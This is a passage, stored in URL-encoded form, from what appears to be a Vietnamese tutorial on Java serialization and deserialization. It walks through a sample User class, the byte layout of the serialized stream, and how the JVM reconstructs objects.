C3%A0nh%20chu%E1%BB%97i%20byte%20c%C3%B3%20th%E1%BB%83%20g%E1%BB%ADi%20%C4%91i%20qua%20m%E1%BA%A1ng%2C%20t%E1%BB%AB%20%C4%91%C3%B3%20h%E1%BB%97%20tr%E1%BB%A3%20vi%E1%BB%87c%20giao%20ti%E1%BA%BFp%20gi%E1%BB%AFa%20c%C3%A1c%20h%E1%BB%87%20th%E1%BB%91ng%20ph%C3%A2n%20t%C3%A1n.%0A*%20L%C6%B0u%20tr%E1%BB%AF%20tr%E1%BA%A1ng%20th%C3%A1i%20c%E1%BB%A7a%20%C4%91%E1%BB%91i%20t%C6%B0%E1%BB%A3ng%3A%0ATr%E1%BA%A1ng%20th%C3%A1i%20c%E1%BB%A7a%20m%E1%BB%99t%20%C4%91%E1%BB%91i%20t%C6%B0%E1%BB%A3ng%20c%C3%B3%20th%E1%BB%83%20%C4%91%C6%B0%E1%BB%A3c%20l%C6%B0u%20v%C3%A0o%20file%20ho%E1%BA%B7c%20c%C6%A1%20s%E1%BB%9F%20d%E1%BB%AF%20li%E1%BB%87u%20d%C6%B0%E1%BB%9Bi%20d%E1%BA%A1ng%20tu%E1%BA%A7n%20t%E1%BB%B1%20h%C3%B3a%2C%20sau%20%C4%91%C3%B3%20%C4%91%C6%B0%E1%BB%A3c%20ph%E1%BB%A5c%20h%E1%BB%93i%20l%E1%BA%A1i%20khi%20c%E1%BA%A7n.%0A*%20Chia%20s%E1%BA%BB%20d%E1%BB%AF%20li%E1%BB%87u%20gi%E1%BB%AFa%20c%C3%A1c%20%E1%BB%A9ng%20d%E1%BB%A5ng%3A%0AD%E1%BB%AF%20li%E1%BB%87u%20serialize%20c%C3%B3%20th%E1%BB%83%20d%E1%BB%85%20d%C3%A0ng%20chia%20s%E1%BA%BB%20gi%E1%BB%AFa%20c%C3%A1c%20th%C3%A0nh%20ph%E1%BA%A7n%20trong%20c%C3%B9ng%20m%E1%BB%99t%20%E1%BB%A9ng%20d%E1%BB%A5ng%20ho%E1%BA%B7c%20gi%E1%BB%AFa%20c%C3%A1c%20%E1%BB%A9ng%20d%E1%BB%A5ng%20%C4%91%E1%BB%99c%20l%E1%BA%ADp.%0A*%20H%E1%BB%97%20tr%E1%BB%A3%20RMI%20(Remote%20Method%20Invocation)%3A%0AJava%20s%E1%BB%AD%20d%E1%BB%A5ng%20serialization%20%C4%91%E1%BB%83%20truy%E1%BB%81n%20%C4%91%E1%BB%91i%20t%C6%B0%E1%BB%A3ng%20gi%E1%BB%AFa%20client%20v%C3%A0%20server%20trong%20m%C3%B4%20h%C3%ACnh%20g%E1%BB%8Di%20ph%C6%B0%C6%A1ng%20th%E1%BB%A9c%20t%E1%BB%AB%20xa%2C%20gi%C3%BAp%20c%C3%A1c%20%E1%BB%A9ng%20d%E1%BB%A5ng%20c%C3%B3%20th%E1%BB%83%20giao%20ti%E1%BA%BFp%20qua%20m%E1%BA%A1ng%20m%E1%BB%99t%20c%C3%A1ch%20d%E1%BB%85%20d%C3%A0ng.%0A*%20Duy%20tr%C3%AC%20tr%E1%BA%A1ng%20th%C3%A1i%20%E1%BB%A9ng%20d%E1%BB%A5ng%3A%0ATrong%20nh%E1%BB%AFng%20tr%C6%B0%E1%BB%9Dng%20h%E1%BB%A3p%20%E1%BB%A9ng%20d%E1%BB%A5ng%20c%E1%BA%A7n%20t%E1%BA%A1m%20d%E1%BB%ABng%20v%C3%A0%20kh%C3%B4i%20ph%E1%BB%A5c%2C%20serialization%20cho%20ph%C3%A9p%20l%C6%B0u%20l%E1%BA%A1i%20tr%E1%BA%A1ng%20th%C3%A1i%20hi%E1%BB%87n%20t%E1%BA%A1i%20c%E1%BB%A7a%20%C4%91%E1%BB%91i%20t%C6%B0%E1%BB%A3ng%20%C4%91%E1%BB%83%20ti%E1%BA%BFp%20t%E1%BB%A5c%20x%E1%BB%AD%20l%C3%BD%20sau%20%C4%91%C3%B3.%0A%0A%23%23%23%23%202.2%20Deserialization%0A!%5Bh%C3%A0m%20deserialize%20trong%20java%5D(https%3A%2F%2Fhackmd.io%2F_uploads%2FSJhCMbLIlx.png)%0A%23%23%23%23%23%20Kh%C3%A1i%20ni%E1%BB%87m%0ADeserialization%20L%C3%A0%20qu%C3%A1%20tr%C3%ACnh%20chuy%E1%BB%83n%20%C4%91%E1%BB%95i%20d%E1%BB%AF%20li%E1%BB%87u%20%C4%91%C3%A3%20%C4%91%C6%B0%E1%BB%A3c%20serialization%20tr%E1%BB%9F%20l%E1%BA%A1i%20th%C3%A0nh%20%C4%91%E1%BB%91i%20t%C6%B0%E1%BB%A3ng%20Java.%20D%E1%BB%AF%20li%E1%BB%87u%20%C4%91%C6%B0%E1%BB%A3c%20%C4%91%E1%BB%8Dc%20t%E1%BB%AB%20ngu%E1%BB%93n%20nh%C6%B0%20m%E1%BA%A1ng%20ho%E1%BA%B7c%20file%2C%20sau%20%C4%91%C3%B3%20%C4%91%C6%B0%E1%BB%A3c%20chuy%E1%BB%83n%20%C4%91%E1%BB%95i%20th%C3%A0nh%20%C4%91%E1%BB%91i%20t%C6%B0%E1%BB%A3ng.%0A%0A%23%23%23%23%23%20%C4%90%E1%BA%B7c%20%C4%91i%E1%BB%83m%20c%E1%BB%A7a%20Deserialization%0AKhi%201%20object%20%C4%91%C6%B0%E1%BB%A3c%20deserialized%2C%20constructor%20c%E1%BB%A7a%20object%20%C4%91%C3%B3%20s%E1%BA%BD%20kh%C3%B4ng%20bao%20gi%E1%BB%9D%20%C4%91%C6%B0%E1%BB%A3c%20g%E1%BB%8Di.%0A%0ATham%20kh%E1%BA%A3o%3A%5BPratik%20T%5D(https%3A%2F%2Fmedium.com%2F%40pratik.941%2Fserialization-and-deserialization-in-java-6dbd11fd31b3)%0A%0A%23%23%23%23%202.3%20Qu%C3%A1%20tr%C3%ACnh%20de%2Fserialization%20trong%20java%20th%E1%BB%B1c%20s%E1%BB%B1%20di%E1%BB%85n%20ra%20nh%C6%B0%20th%E1%BA%BF%20n%C3%A0o%3F%0AKhi%20ch%C3%BAng%20ta%20%C4%91%C3%A3%20c%C3%B3%20ki%E1%BA%BFn%20th%E1%BB%A9c%20v%E1%BB%81%20serialization%20m%E1%BB%99t%20%C4%91%E1%BB%91i%20t%C6%B0%E1%BB%A3ng%20trong%20java%20r%E1%BB%93i%20th%C3%AC%20ch%C3%BAng%20ta%20s%E1%BA%BD%20%C4%91i%20ti%E1%BA%BFp%20qu%C3%A1%20tr%C3%ACnh%20serialization%20v%C3%A0%20deserialization%20th%E1%BB%B1c%20s%E1%BB%B1%20di%E1%BB%85n%20ra%20nh%C6%B0%20th%E1%BA%BF%20n%C3%A0o.%0A%23%23%23%23%23%20Qu%C3%A1%20tr%C3%ACnh%20serialization%20trong%20java%20di%E1%BB%85n%20ra%20nh%C6%B0%20th%E1%BA%BF%20n%C3%A0o%0A*%20Nh%C6%B0%20ch%C3%BAng%20ta%20%C4%91%C3%A3%20bi%E1%BA%BFt%20sau%20khi%20serialize%20th%C3%AC%20ch%C3%BAng%20ta%20c%C3%B3%20%C4%91%C6%B0%E1%BB%A3c%20byte%20streams%2C%20v%C3%A0%20ta%20c%C3%B3%20th%E1%BB%83%20%C4%91%E1%BB%8Dc%20%C4%91%C6%B0%E1%BB%A3c%20n%E1%BB%99i%20dung%20byte%20streams%20b%E1%BA%B1ng%20c%C3%A1ch%20s%E1%BB%AD%20d%E1%BB%A5ng%201%20s%E1%BB%91%20c%C3%B4ng%20c%E1%BB%A5%20nh%C6%B0%20hex-editor%20%C4%91%E1%BB%83%20ta%20c%C3%B3%20th%E1%BB%83%20th%E1%BA%A5y%20d%E1%BB%AF%20li%E1%BB%87u%20l%C3%A0%20d%E1%BA%A1ng%20chu%E1%BB%97i%20nh%E1%BB%8B%20ph%C3%A2n%20(binary%20string).(%C4%91%E1%BB%8Dc%20th%C3%AAm%20%E1%BB%9F%20%5B%C4%91%C3%A2y%5D(https%3A%2F%2Fdocs.oracle.com%2Fjavase%2F8%2Fdocs%2Fapi%2Fjava%2Fio%2FObjectStreamConstants.html)%20%C4%91%E1%BB%83%20hi%E1%BB%83u%20r%C3%B5%20h%C6%A1n)%0A*%20Tr%C6%B0%E1%BB%9Bc%20ti%C3%AAn%20ch%C3%BAng%20ta%20xem%20qua%20thu%E1%BA%ADt%20to%C3%A1n%20serialization%3A%0A%20%20%20%20-%20Vi%E1%BA%BFt%20ra%20si%C3%AAu%20d%E1%BB%AF%20li%E1%BB%87u%20(metadata%20-%20m%C3%B4%20t%E1%BA%A3)%20c%E1%BB%A7a%20l%E1%BB%9Bp%20%C4%91%C6%B0%E1%BB%A3c%20li%C3%AAn%20k%E1%BA%BFt%20v%E1%BB%9Bi%20%C4%91%E1%BB%91i%20t%C6%B0%E1%BB%A3ng.%0A%20%20%20%20-%20%C4%90%E1%BB%87%20quy%20vi%E1%BA%BFt%20ra%20m%C3%B4%20t%E1%BA%A3%20c%E1%BB%A7a%20c%C3%A1c%20l%E1%BB%9Bp%20cha%20cho%20%C4%91%E1%BA%BFn%20khi%20t%C3%ACm%20th%E1%BA%A5y%20java.lang.object.%0A%20%20%20%20-%20Khi%20k%E1%BA%BFt%20th%C3%BAc%20vi%E1%BB%87c%20vi%E1%BA%BFt%20th%C3%B4ng%20tin%20si%C3%AAu%20d%E1%BB%AF%20li%E1%BB%87u%2C%20n%C3%B3%20s%E1%BA%BD%20b%E1%BA%AFt%20%C4%91%E1%BA%A7u%20v%E1%BB%9Bi%20d%E1%BB%AF%20li%E1%BB%87u%20th%E1%BB%B1c%20t%E1%BA%BF%20%C4%91%C6%B0%E1%BB%A3c%20li%C3%AAn%20k%E1%BA%BFt%20v%E1%BB%9Bi%20%C4%91%E1%BB%91i%20t%C6%B0%E1%BB%A3ng.%20Nh%C6%B0ng%20l%E1%BA%A7n%20n%C3%A0y%2C%20b%E1%BA%AFt%20%C4%91%E1%BA%A7u%20t%E1%BB%AB%20l%E1%BB%9Bp%20cha%20tr%C3%AAn%20c%C3%B9ng.%0A%20%20%20%20-%20%C4%90%E1%BB%87%20quy%20ghi%20d%E1%BB%AF%20li%E1%BB%87u%20li%C3%AAn%20quan%20%C4%91%E1%BA%BFn%20%C4%91%E1%BB%91i%20t%C6%B0%E1%BB%A3ng%2C%20b%E1%BA%AFt%20%C4%91%E1%BA%A7u%20t%E1%BB%AB%20l%E1%BB%9Bp%20cha%20nh%E1%BB%8F%20nh%E1%BA%A5t%20%C4%91%E1%BA%BFn%20l%E1%BB%9Bp%20l%E1%BB%9Bn%20nh%E1%BA%A5t.%0A%0A*%20%C4%90%E1%BB%83%20hi%E1%BB%83u%20r%C3%B5%20h%C6%A1n%20m%C3%ACnh%20s%E1%BA%BD%20v%C3%AD%20d%E1%BB%A5%20v%E1%BB%9Bi%20serialize%20data%20n%C3%A0y%20v%C3%A0%20%C4%91o%E1%BA%A1n%20code%20n%C3%A0y%20c%E1%BB%A7a%20b%E1%BA%A1n%20%5Bendy%5D(https%3A%2F%2Fhackmd.io%2F%40endy%2Fr1sYTUYOh%3Fstext%3D2315%253A45%253A0%253A1752726947%253AwE92du)%20r%E1%BB%93i%20ch%C3%BAng%20ta%20c%C3%B9ng%20ph%C3%A2n%20t%C3%ADch.%0A%60%60%60java%0A%2F%2F%20User.java%0Aimport%20java.io.Serializable%3B%0A%0Apublic%20class%20User%20implements%20Serializable%20%7B%0A%20%20%20%20private%20String%20name%3B%0A%20%20%20%20private%20int%20age%3B%0A%0A%20%20%20%20public%20User()%20%7B%0A%20%20%20%20%7D%0A%20%20%20%20public%20User(String%20name%2C%20int%20age)%20%7B%0A%20%20%20%20%20%20%20%20this.name%20%3D%20name%3B%0A%20%20%20%20%20%20%20%20this.age%20%3D%20age%3B%0A%20%20%20%20%7D%0A%20%20%20%20...%0A%7D%0A%60%60%60%0A%60%60%60java%0A%2F%2F%20main.java%0Aimport%20java.io.*%3B%0A%0Apublic%20class%20Main%20%7B%0A%20%20%20%20public%20static%20void%20main(String%5B%5D%20args)%20%7B%0A%20%20%20%20%20%20%20%20User%20a%20%3D%20new%20User(%22endy%22%2C%2020)%3B%0A%0A%20%20%20%20%20%20%20%20%2F%2F%20Serialize%20data%0A%20%20%20%20%20%20%20%20try%20%7B%0A%20%20%20%20%20%20%20%20%20%20%20%20FileOutputStream%20fileOut%20%3D%20new%20FileOutputStream(%22data.ser%22)%3B%0A%20%20%20%20%20%20%20%20%20%20%20%20ObjectOutputStream%20objectOut%20%3D%20new%20ObjectOutputStream(fileOut)%3B%0A%20%20%20%20%20%20%20%20%20%20%20%20objectOut.writeObject(a)%3B%0A%20%20%20%20%20%20%20%20%20%20%20%20objectOut.close()%3B%0A%20%20%20%20%20%20%20%20%20%20%20%20fileOut.close()%3B%0A%20%20%20%20%20%20%20%20%20%20%20%20System.out.println(%22Object%20serialized%20and%20saved%20to%20data.ser%22)%3B%0A%20%20%20%20%20%20%20%20%7D%20catch%20(Exception%20e)%20%7B%0A%20%20%20%20%20%20%20%20%20%20%20%20e.printStackTrace()%3B%0A%20%20%20%20%20%20%20%20%7D%0A%0A%20%20%20%20%20%20%20%20%2F%2F%20Deserialize%20data%0A%20%20%20%20%20%20%20%20try%20%7B%0A%20%20%20%20%20%20%20%20%20%20%20%20FileInputStream%20fileIn%20%3D%20new%20FileInputStream(%22data.ser%22)%3B%0A%20%20%20%20%20%20%20%20%20%20%20%20ObjectInputStream%20objectIn%20%3D%20new%20ObjectInputStream(fileIn)%3B%0A%20%20%20%20%20%20%20%20%20%20%20%20User%20deserializedObject%20%3D%20(User)%20objectIn.readObject()%3B%0A%20%20%20%20%20%20%20%20%20%20%20%20objectIn.close()%3B%0A%20%20%20%20%20%20%20%20%20%20%20%20fileIn.close()%3B%0A%0A%20%20%20%20%20%20%20%20%20%20%20%20%2F%2F%20Print%20the%20deserialized%20object%0A%20%20%20%20%20%20%20%20%20%20%20%20System.out.println(%22Deserialized%20Object%3A%22)%3B%0A%20%20%20%20%20%20%20%20%20%20%20%20System.out.println(%22Name%3A%20%22%20%2B%20deserializedObject.getName())%3B%0A%20%20%20%20%20%20%20%20%20%20%20%20System.out.println(%22Age%3A%20%22%20%2B%20deserializedObject.getAge())%3B%0A%20%20%20%20%20%20%20%20%7D%20catch%20(IOException%20%7C%20ClassNotFoundException%20e)%20%7B%0A%20%20%20%20%20%20%20%20%20%20%20%20e.printStackTrace()%3B%0A%20%20%20%20%20%20%20%20%7D%0A%20%20%20%20%7D%0A%7D%0A%0A%60%60%60%0A%C4%91o%E1%BA%A1n%20code%20tr%C3%AAn%20serialize%20object%20user%20th%C3%A0nh%20file%20data.ser%20v%C3%A0%20sau%20%C4%91%E1%BA%A5y%20ch%C3%BAng%20ta%20xem%20file%20d%E1%BA%A1ng%20binary%20string%20ta%20th%E1%BA%A5y%20%C4%91%C6%B0%E1%BB%A3c%20d%E1%BB%AF%20li%E1%BB%87u%20nh%C6%B0%20n%C3%A0y.%0A!%5Bserialize%20data%5D(https%3A%2F%2Fhackmd.io%2F_uploads%2FrJ6gPuXLle.png)%0A*%20L%C3%BAc%20n%C3%A0y%20ta%20%C4%91i%20ph%C3%A2n%20t%C3%ADch%20k%C4%A9%20h%C6%A1n%2C%20ta%20c%C3%B3%20%C4%91%C6%B0%E1%BB%A3c%3A%0A%3E%20%5Bcolor%3D%231e90ff%5DAC%20ED%3A%20STREAM_MAGIC.%20Ch%E1%BB%89%20%C4%91%E1%BB%8Bnh%20r%E1%BA%B1ng%20%C4%91%C3%A2y%20l%C3%A0%20m%E1%BB%99t%20giao%20th%E1%BB%A9c%20serialization%0A%3E%2000%2005%3A%20STREAM_VERSION.%20%C4%90%C3%A2y%20l%C3%A0%20phi%C3%AAn%20b%E1%BA%A3n%20c%E1%BB%A7a%20serialization%0A%3E%200x73%3A%20TC_OBJECT.%20Ch%E1%BB%89%20%C4%91%E1%BB%8Bnh%20r%E1%BA%B1ng%20%C4%91%C3%A2y%20l%C3%A0%20m%E1%BB%99t%20%C4%91%E1%BB%91i%20t%C6%B0%E1%BB%A3ng%20m%E1%BB%9Bi%0A%0AB%C6%B0%E1%BB%9Bc%20%C4%91%E1%BA%A7u%20ti%C3%AAn%20c%E1%BB%A7a%20thu%E1%BA%ADt%20to%C3%A1n%20serialization%20l%C3%A0%20vi%E1%BA%BFt%20m%C3%B4%20t%E1%BA%A3%20c%E1%BB%A7a%20l%E1%BB%9Bp%20%C4%91%C6%B0%E1%BB%A3c%20li%C3%AAn%20k%E1%BA%BFt%20v%E1%BB%9Bi%20m%E1%BB%99t%20%C4%91%E1%BB%91i%20t%C6%B0%E1%BB%A3ng.%20%E1%BB%9E%20v%C3%AD%20d%E1%BB%A5%20tr%C3%AAn%20ta%20th%E1%BA%A5y%20%C4%91%C6%B0%E1%BB%A3c%20thu%E1%BA%ADt%20to%C3%A1n%20b%E1%BA%AFt%20%C4%91%E1%BA%A7u%20v%E1%BB%9Bi%20SerialTest%20%C4%91%E1%BB%83%20ch%C3%BAng%20ta%20bi%E1%BA%BFt%20%C4%91%C6%B0%E1%BB%A3c%20t%C3%AAn%20class%2C%20serialVersionUID.%0A%3E%20%5Bcolor%3D%231e90ff%5D%200x72%3A%20TC_CLASSDESC.%20Ch%E1%BB%89%20%C4%91%E1%BB%8Bnh%20r%E1%BA%B1ng%20%C4%91%C3%A2y%20l%C3%A0%20m%E1%BB%99t%20l%E1%BB%9Bp%20m%E1%BB%9Bi%0A%3E%2000%2004%3A%20%C4%90%E1%BB%99%20d%C3%A0i%20c%E1%BB%A7a%20t%C3%AAn%20l%E1%BB%9Bp%0A%3E%2055%2073%2065%2072%3A%20User%2C%20t%C3%AAn%20c%E1%BB%A7a%20l%E1%BB%9Bp.%0A%3E%201C%2054%2011%2043%2062%2088%2006%2036%3A%20serialVersionUID%2C%20%C4%91%E1%BB%8Bnh%20danh%20phi%C3%AAn%20b%E1%BA%A3n%20serialization%20c%E1%BB%A7a%20l%E1%BB%9Bp%20n%C3%A0y%20l%C3%A0%200x1C54114362880636.%0A%3E%200x02%3A%20%20Various%20flags.%20C%E1%BB%9D%20n%C3%A0y%20n%C3%B3i%20r%E1%BA%B1ng%20%C4%91%E1%BB%91i%20t%C6%B0%E1%BB%A3ng%20h%E1%BB%97%20tr%E1%BB%A3%20serialization.(SC_SERIALIZABLE)%0A%3E%2000%2002%3A%20S%E1%BB%91%20tr%C6%B0%E1%BB%9Dng%20trong%20l%E1%BB%9Bp%20n%C3%A0y%20l%C3%A0%202.%0A%0ATi%E1%BA%BFp%20theo%2C%20thu%E1%BA%ADt%20to%C3%A1n%20s%E1%BA%BD%20vi%E1%BA%BFt%20m%C3%B4%20t%E1%BA%A3%20cho%20tr%C6%B0%E1%BB%9Dng%20int%20age%20%3D%2020(Field%20%231)%0A%3E%20%5Bcolor%3D%231e90ff%5D%200x49%3A%20M%C3%A3%20lo%E1%BA%A1i%20tr%C6%B0%E1%BB%9Dng%3A%2049%20%C4%91%E1%BA%A1i%20di%E1%BB%87n%20cho%20%22I%22%2C%20vi%E1%BA%BFt%20t%E1%BA%AFt%20c%E1%BB%A7a%20Int.%0A%3E%2000%2003%3A%20Chi%E1%BB%81u%20d%C3%A0i%20c%E1%BB%A7a%20t%C3%AAn%20tr%C6%B0%E1%BB%9Dng.%0A%3E%2061%2067%2065%3A%20age%2C%20t%C3%AAn%20c%E1%BB%A7a%20tr%C6%B0%E1%BB%9Dng.%0A%0AV%C3%A0%20sau%20%C4%91%C3%B3%20thu%E1%BA%ADt%20to%C3%A1n%20vi%E1%BA%BFt%20m%C3%B4%20t%E1%BA%A3%20tr%C6%B0%E1%BB%9Dng%20ti%E1%BA%BFp%20theo%20l%C3%A0%20name%3Dendy(Field%20%232)%0A%3E%20%5Bcolor%3D%231e90ff%5D%200x4C%20%3A%20'L'%20m%C3%A3%20ki%E1%BB%83u%20field%20object%2Freference.%0A%3E%2000%2004%3A%20Chi%E1%BB%81u%20d%C3%A0i%20t%C3%AAn%20tr%C6%B0%E1%BB%9Dng%20%3D%204.%0A%3E%206E%2061%206D%2065%3A%20name%2C%20t%C3%AAn%20c%E1%BB%A7a%20tr%C6%B0%E1%BB%9Dng.%0A%3E%200x74%3A%20TC_STRING%20%E2%80%93%20b%E1%BA%AFt%20%C4%91%E1%BA%A7u%20ch%E1%BB%AF%20k%C3%BD%20JVM%20c%E1%BB%A7a%20field%20ki%E1%BB%83u%20object%0A%3E%2000%2012%3A%20%C4%90%E1%BB%99%20d%C3%A0i%20chu%E1%BB%97i%20%3D%2018%0A%3E%204C%206A%2061%2076%2061%202F%206C%2061%206E%2067%202F%2053%2074%2072%2069%206E%2067%203B%3A%20Ch%E1%BB%AF%20k%C3%BD%20JVM%20chu%E1%BA%A9n%20cho%20String%20class(Ljava%2Flang%2FString%3B)%0A%3E%200x78%3A%20TC_ENDBLOCKDATA.%20K%E1%BA%BFt%20th%C3%BAc%20block%20d%E1%BB%AF%20li%E1%BB%87u%20m%C3%B4%20t%E1%BA%A3.%0A%3E%200x70%3A%20TC_NULL.%20%C4%90%E1%BA%A1i%20di%E1%BB%87n%20cho%20th%E1%BB%B1c%20t%E1%BA%BF%20l%C3%A0%20kh%C3%B4ng%20c%C3%B2n%20l%E1%BB%9Bp%20cha%20ph%C3%ADa%20tr%C3%AAn%20n%E1%BB%AFa%20v%C3%AC%20ta%20%C4%91%C3%A3%20%C4%91%E1%BA%A1t%20%C4%91%E1%BA%BFn%20%C4%91%E1%BB%89nh%20c%E1%BB%A7a%20h%E1%BB%87%20th%E1%BB%91ng%20ph%C3%A2n%20c%E1%BA%A5p%20l%E1%BB%9Bp.%0A%3E%2000%2000%2000%2014%3A%20gi%C3%A1%20tr%E1%BB%8B%20c%E1%BB%A7a%20field%20int%20age%20%3D%2020.%0A%3E%200x74%3A%20TC_STRING.%20T%E1%BA%A1o%20chu%E1%BB%97i%20m%E1%BB%9Bi%20gi%C3%A1%20tr%E1%BB%8B%20c%E1%BB%A7a%20tr%C6%B0%E1%BB%9Dng%20name.%0A%3E%2000%2004%3A%20%C4%90%E1%BB%99%20d%C3%A0i%20c%E1%BB%A7a%20tr%C6%B0%E1%BB%9Dng%20name.%0A%3E%2065%206E%2064%2079%3A%20%22endy%22%2C%20gi%C3%A1%20tr%E1%BB%8B%20c%E1%BB%A7a%20tr%C6%B0%E1%BB%9Dng%20name%0A%0A%23%23%23%23%23%20Qu%C3%A1%20tr%C3%ACnh%20deserialization%20trong%20java%20di%E1%BB%85n%20ra%20nh%C6%B0%20th%E1%BA%BF%20n%C3%A0o%0ASau%20khi%20bi%E1%BA%BFt%20%C4%91%C6%B0%E1%BB%A3c%20chi%20ti%E1%BA%BFt%20qu%C3%A1%20tr%C3%ACnh%20serilaization%20ho%E1%BA%A1t%20%C4%91%E1%BB%99ng%20r%E1%BB%93i%2C%20gi%E1%BB%9D%20ch%C3%BAng%20ta%20s%E1%BA%BD%20%C4%91i%20ng%C6%B0%E1%BB%A3c%20l%E1%BA%A1i%20qu%C3%A1%20tr%C3%ACnh%20%C4%91%C3%B3%20di%E1%BB%85n%20ra%20nh%C6%B0%20th%E1%BA%BF%20n%C3%A0o%20v%C3%A0%20bi%E1%BA%BFt%20%C4%91%C6%B0%E1%BB%A3c%20t%E1%BA%A1i%20sao%20%20JVM%20t%E1%BA%A1o%20%C4%91%C6%B0%E1%BB%A3c%20%C4%91%E1%BB%91i%20t%C6%B0%E1%BB%A3ng%20m%C3%A0%20kh%C3%B4ng%20g%E1%BB%8Di%20constructor.%0A%C4%90%C3%A2y%20l%C3%A0%20c%C3%A1ch%20n%C3%B3%20di%E1%BB%85n%20ra%3A%0A*%20B%E1%BA%A5t%20k%C3%AC%20l%E1%BB%9Bp%20cha%20n%C3%A0o%20c%E1%BB%A7a%20%C4%91%E1%BB%91i%20t%C6%B0%E1%BB%A3ng%20ph%E1%BA%A3i%20serializable%20v%C3%A0%20n%E1%BA%BFu%20kh%C3%B4ng%20serializable%20th%C3%AC%20ph%E1%BA%A3i%20t%E1%BB%93n%20t%E1%BA%A1i%20constructor%20m%E1%BA%B7c%20%C4%91%E1%BB%8Bnh%20(kh%C3%B4ng%20tham%20s%E1%BB%91%20).%0A*%20Trong%20qu%C3%A1%20tr%C3%ACnh%20deserializaion%2C%20l%E1%BB%9Bp%20cha%20c%E1%BB%A7a%20l%E1%BB%9Bp%20ch%E1%BB%A9a%20%C4%91%E1%BB%91i%20t%C6%B0%E1%BB%A3ng%20s%E1%BA%BD%20%C4%91%C6%B0%E1%BB%A3c%20t%C3%ACm%20ki%E1%BA%BFm%20%C4%91%E1%BA%A7u%20ti%C3%AAn%20cho%20%C4%91%E1%BA%BFn%20khi%20t%C3%ACm%20th%E1%BA%A5y%201%20l%E1%BB%9Bp%20kh%C3%B4ng%20%C4%91%C6%B0%E1%BB%A3c%20serializable%20v%C3%A0%20t%E1%BB%93n%20t%E1%BA%A1i%20constructor%20m%E1%BA%B7c%20%C4%91%E1%BB%8Bnh.%20JVM%20s%E1%BA%BD%20kh%E1%BB%9Fi%20t%E1%BA%A1o%20%C4%91%E1%BB%91i%20t%C6%B0%E1%BB%A3ng%20r%E1%BB%97ng%20c%E1%BB%A7a%20l%E1%BB%9Bp%20%C4%91%C3%B3.%0A*%20N%E1%BA%BFu%20t%E1%BA%A5t%20c%E1%BA%A3%20c%C3%A1c%20l%E1%BB%9Bp%20cha%20%C4%91%E1%BB%81u%20%C4%91%C6%B0%E1%BB%A3c%20serializble%20th%C3%AC%20JVM%20s%E1%BA%BD%20ti%E1%BA%BFp%20c%E1%BA%ADn%20l%E1%BB%9Bp%20Object%20v%C3%A0%20t%E1%BA%A1o%20%C4%91%E1%BB%91i%20t%C6%B0%E1%BB%A3ng%20c%E1%BB%A7a%20l%E1%BB%9Bp%20%C4%91%C3%B3.%0A*%20Sau%20khi%20g%E1%BB%8Di%20constructor%20m%E1%BA%B7c%20%C4%91%E1%BB%8Bnh%20c%E1%BB%A7a%20l%E1%BB%9Bp%20%C4%91%C3%B3%20JVM%20s%E1%BA%BD%20kh%C3%B4ng%20g%E1%BB%8Di%20b%E1%BA%A5t%20k%C3%AC%20constructor%20n%C3%A0o%20kh%C3%A1c%20n%E1%BB%AFa.%0A*%20Sau%20khi%20t%E1%BA%A1o%20%C4%91%E1%BB%91i%20t%C6%B0%E1%BB%A3ng%20r%E1%BB%97ng%2C%20JVM%20s%E1%BA%BD%20thi%E1%BA%BFt%20l%E1%BA%ADp%20tr%C6%B0%E1%BB%9Dng%20static%20c%E1%BB%A7a%20n%C3%B3%20tr%C6%B0%E1%BB%9Bc%2C%20sau%20%C4%91%C3%B3%20%C4%91%E1%BB%8Dc%20chu%E1%BB%97i%20byte%20v%C3%A0%20s%E1%BB%AD%20d%E1%BB%A5ng%20metadata%20c%E1%BB%A7a%20l%E1%BB%9Bp%20%C4%91%E1%BB%83%20thi%E1%BA%BFt%20l%E1%BA%ADp%20ki%E1%BB%83u%20d%E1%BB%AF%20li%E1%BB%87u%20c%C5%A9ng%20nh%C6%B0%20c%C3%A1c%20th%C3%B4ng%20tin%20kh%C3%A1c%20c%E1%BB%A7a%20%C4%91%E1%BB%91i%20t%C6%B0%E1%BB%A3ng.%0A*%20Ti%E1%BA%BFp%20theo%20JVM%20g%E1%BB%8Di%20ph%C6%B0%C6%A1ng%20th%E1%BB%A9c%20readObject()%20m%E1%BA%B7c%20%C4%91%E1%BB%8Bnh(n%E1%BA%BFu%20ch%C6%B0a%20b%E1%BB%8B%20ghi%20%C4%91%C3%A8%20ng%C6%B0%E1%BB%A3c%20l%E1%BA%A1i%20s%E1%BA%BD%20g%E1%BB%8Di%20ph%C6%B0%C6%A1ng%20th%E1%BB%A9c%20readObject()%20%C4%91%C3%A3%20%C4%91%C6%B0%E1%BB%A3c%20ghi%20%C4%91%C3%A8%20)%20c%C3%B3%20nhi%E1%BB%87m%20v%E1%BB%A5%20%C4%91%E1%BA%B7t%20c%C3%A1c%20gi%C3%A1%20tr%E1%BB%8B%20t%E1%BB%AB%20byte%20stream%20v%C3%A0o%20%C4%91%E1%BB%91i%20t%C6%B0%E1%BB%A3ng.%0A*%20Sau%20khi%20readObject()%20ho%C3%A0n%20th%C3%A0nh%20th%C3%AC%20%C4%91%E1%BB%91i%20t%C6%B0%E1%BB%A3ng%20m%E1%BB%9Bi%20%C4%91%C6%B0%E1%BB%A3c%20t%E1%BA%A1o%20ra.%20L%C6%B0u%20%C3%AD%20c%E1%BA%A7n%20ph%E1%BA%A3i%20%C3%A9p%20ki%E1%BB%83u%20v%E1%BB%81%20%C4%91%E1%BB%91i%20t%C6%B0%E1%BB%A3ng%20ch%C3%BAng%20ta%20serialized.%0A%0AN%E1%BA%BFu%20%C3%A1p%20d%E1%BB%A5ng%20v%E1%BB%9Bi%20v%C3%AD%20d%E1%BB%A5%20tr%C3%AAn%20th%C3%AC%20sau%20khi%20qu%C3%A1%20tr%C3%ACnh%20Serialize%20r%E1%BB%93i%20th%C3%AC%20Deserialize%20n%C3%B3%20s%E1%BA%BD%20nh%C6%B0%20n%C3%A0y%3A%0A*%20JVM%20%C4%91%E1%BB%8Dc%20ph%E1%BA%A7n%20%C4%91%E1%BA%A7u%20stream%0A%3E%20%5Bcolor%3D%231e90ff%5DAC%20ED%3A%20STREAM_MAGIC%20%E2%80%93%20b%C3%A1o%20hi%E1%BB%87u%20%C4%91%C3%A2y%20l%C3%A0%20m%E1%BB%99t%20file%20serialized%20Java%20object%0A00%2005%3A%20STREAM_VERSION%20%E2%80%93%20version%205%20c%E1%BB%A7a%20Java%20Serialization%0A*%20JVM%20g%E1%BA%B7p%20TC_OBJECT%20%E2%86%92%20bi%E1%BA%BFt%20r%E1%BA%B1ng%20%C4%91ang%20deserialize%20